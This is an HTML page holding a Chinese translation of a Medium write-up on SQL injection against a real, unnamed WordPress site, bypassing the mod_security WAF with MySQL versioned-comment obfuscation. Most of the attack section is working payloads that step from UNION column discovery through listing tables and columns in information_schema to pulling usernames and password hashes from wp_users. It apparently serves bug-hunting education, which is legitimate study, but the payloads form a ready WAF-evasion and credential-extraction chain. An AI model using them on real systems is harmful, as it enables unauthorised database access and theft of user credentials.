<html>
<head>
<title>Fun sql injection — mod_security bypass</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">有趣的sql注入—绕过mod_security</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/fun-sql-injection-mod-security-bypass-644b54b0c445?source=collection_archive---------1-----------------------#2021-04-16">https://infosecwriteups.com/fun-sql-injection-mod-security-bypass-644b54b0c445?source=collection_archive---------1-----------------------#2021-04-16</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/></div><div class="ab cl jq jr hx js" role="separator"><span class="jt bw bk ju jv jw"/><span class="jt bw bk ju jv jw"/><span class="jt bw bk ju jv"/></div><div class="im in io ip iq"><p id="d707" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">在这篇文章中，我想向你展示一个我在测试一个网站时遇到的有点特殊的案例。</p><p id="549b" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这是一个sql注入，我可以绕过“mod _ security”waf。当我开始sql注入测试时，我意识到网站正在使用waf。</p><p id="c03a" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我们使用一个简单的:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="a42f" class="le lf it la b gy lg lh l li lj">site/ejemplo?parameter=-1+union+selec+1,2,3,4,5,6,7+--+</span></pre><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lk"><img src="../Images/44feee03d95d2360b2fe8e0c310adc4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*QwcRcrUUPQ2T7dr9"/></div></div></figure><p id="93d0" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">现在，我不打算骗你，只是通过用注释对有效载荷进行编码，我就能够绕过waf过滤器。</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="0b50" class="le lf it la b gy lg lh l li lj">site/ejemplo?parameter=-1+/*!50000union*/+/*!50000selec*/+1,2,3,4,5,6,7+--+</span></pre><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi ls"><img src="../Images/539e56564db33eca9d8e573f620491fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*seM9EpjA-cBvcZOOSJ5s1Q.png"/></div></div></figure><p id="9608" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们可以看到其中一个易受攻击的列是第四列。</p><p id="54aa" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">但是像所有喜欢sql注入的人一样，我决定不像那样离开它，尝试其他方法、其他有效负载..经过多次测试和失败的混合载荷。</p><p id="fd21" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我最终尝试了这个:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="c083" class="le lf it la b gy lg lh l li lj">AND mod(29,9)+div+<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>:=(concat(database(),"--","_Y000!_"))+UNION+DISTINCTROW+SELECT+1,2,3,<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>,5,6,7</span></pre><p id="e1f8" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这是怎么回事？</p><p id="6490" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们有:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="4411" class="le lf it la b gy lg lh l li lj">"AND" = The AND operator returns a record if all conditions separated by AND are TRUE.</span><span id="c4e0" class="le lf it la b gy lu lh l li lj">"mod(29,9)" = The mod function is to make a division between the values.</span><span id="3af7" class="le lf it la b gy lu lh l li lj">"div" = In sql the div function is used to divide</span><span id="689e" class="le lf it la b gy lu lh l li lj">"@a:=" = This serves as an alias to save an sql query inside, example: <a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>:=(concat(database(),"--","_Y000!_"))</span><span id="5919" class="le lf it la b gy lu lh l li lj">"union" = works to join more than 2 sql commands</span><span id="e0fc" class="le lf it la b gy lu lh l li lj">"distinctrow" = helps us avoid duplicate results</span><span id="6959" class="le lf it la b gy lu lh l li lj">"select" = select what we want from the database</span><span id="2b09" class="le lf it la b gy lu lh l li lj">"1,2,3,4,5,6,7" = number of columns in the database</span><span id="4be0" class="le lf it la b gy lu lh l li lj">"AND mod(29,9)+div+<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>:=(concat(database(),"--","_Y000!_"))+UNION+DISTINCTROW+SELECT+1,2,3,<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>,5,6,7"</span></pre><p id="7ddf" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">在没有任何编码的情况下注入这个有效负载，我们得到的结果如下:</p><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lv"><img src="../Images/69b5e4afa52c0438c42fb1dd5c7db904.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZPT3rYYIfr57LMxJFJUijQ.png"/></div></div></figure><p id="fd72" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">记住，以前我们可以使用注释编码跳过过滤器:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="babb" class="le lf it la b gy lg lh l li lj">-1+AND+mod(29,9)+div+<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>,"_Y000!_",6,7--+</span></pre><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lw"><img src="../Images/25730fc392497d60935367c3a641dbf7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tp6iahHvBF6Bzrzh_5Mtmg.png"/></div></div></figure><p id="5e77" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">通过编码，我们再次跳过了waf，但是有了新的有效载荷！</p><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lx"><img src="../Images/ac52eb3401875e8b0cc521fdbceb8f32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*3T5Xbby1tiw2TBd8"/></div></div></figure><p id="e84a" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">现在我要教一些我觉得有趣的东西。</p><p id="5601" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">正如我们在前面的图像中看到的，我们能够从数据库中提取信息，在这个例子中，在这个名称中，我们也有一些分隔符和我的昵称，这要感谢concat内部的注入</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="bdc6" class="le lf it la b gy lg lh l li lj"><a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)</span></pre><p id="75dd" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们在“描述”部分有这个，但是在右边我们有下载文件的选项。</p><p id="8dcb" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">有趣的是，下载文件的选项也是易受攻击的，并清楚地向我们显示易受攻击的列是第5位。</p><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi ly"><img src="../Images/56dcbc04aea05431b42b4242ea3d2f93.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3T5wQXggQFACDp1wCqAzwA.png"/></div></div></figure><p id="73c4" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">趁着bug，我们再多测试一点！</p><p id="0e61" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们向负载添加了一些信息，以便能够从数据库表的名称中提取基本信息:</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="6eb4" class="le lf it la b gy lg lh l li lj">-1+AND+mod(29,9)+div+<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>,table_name,6,7+/*!50000from*/+/*!50000information_schema.tables*/+--+</span></pre><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lw"><img src="../Images/d2f864195ed01083dbefdca079b23427.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9IQH1PmCWLVoo8zqk_h6oQ.png"/></div></div></figure><p id="fc94" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们得到了以下结果:</p><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi lz"><img src="../Images/6ff0eb1a48131ef771013ccb95602fe6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tHfzEO3Vpas3Yy5MgQy6qw.png"/></div></div></figure><p id="60e4" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">你可以看到，之前我们只有一个文件要下载，在这种情况下，当向有效负载添加句子以提取表的名称时，会出现更多信息，但更仔细地看，出现的所有新信息都是有效负载提取的数据库信息，正如你在右侧的图像中可以看到的，我们有许多用于HTML中的表的<tr> </tr>，在每个表中我们都有数据库的表的名称。</p><p id="35b5" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">再看一点…我意识到页面用了wordpress …</p></div><div class="ab cl jq jr hx js" role="separator"><span class="jt bw bk ju jv jw"/><span class="jt bw bk ju jv jw"/><span class="jt bw bk ju jv"/></div><div class="im in io ip iq"><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi ma"><img src="../Images/0e53ea10fb7cf739b1cf76df1f669cdb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LcYRP_BnJ5CZcSPdED8Eog.png"/></div></div></figure><p id="72d7" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">它真的让我们无所遁形！</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="05d1" class="le lf it la b gy lg lh l li lj">-1+AND+mod(29,9)+div+<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>,column_name,6,7+/*!50000from*/+/*!50000information_schema.columns*/+/*!50000where*/+/*!50000table_name="wp_users"*/+--+</span></pre><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi mb"><img src="../Images/27d9b003f69440dd27bddada7e696426.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BQACLknlGdNxtN9r0JZQig.png"/></div></div></figure><p id="b164" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">最后，我找到了用户名和密码信息</p><pre class="kv kw kx ky gt kz la lb lc aw ld bi"><span id="fd1b" class="le lf it la b gy lg lh l li lj">-1+AND+mod(29,9)+div+<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)+/*!50000UNION*//**//*!50000DISTINCTROW*/+/*!50000SELECT*/+1,2,3,<a class="ae lt" href="http://twitter.com/a" rel="noopener ugc nofollow" target="_blank">@a</a>,/*!50000CoNcAt(user_nicename,"--",user_pass)*/,6,7+/*!50000from*/+/*!50000wp_users*/+--+</span></pre><figure class="kv kw kx ky gt ll gh gi paragraph-image"><div role="button" tabindex="0" class="lm ln di lo bf lp"><div class="gh gi ls"><img src="../Images/797e7b336654ea369f73a386a50b708c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LHF5na_TKdUSZiAQsrxGng.png"/></div></div></figure><p id="d09f" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">注意:不要到处留下未标记的站点，错误可能出现在最意想不到的地方</p><p id="c93d" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">非常感谢你花时间阅读这篇文章。</p><p id="b1f9" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated"><strong class="jz iu">你觉得怎么样？你遇到过类似的错误吗？</strong></p></div></div>    
</body>
</html>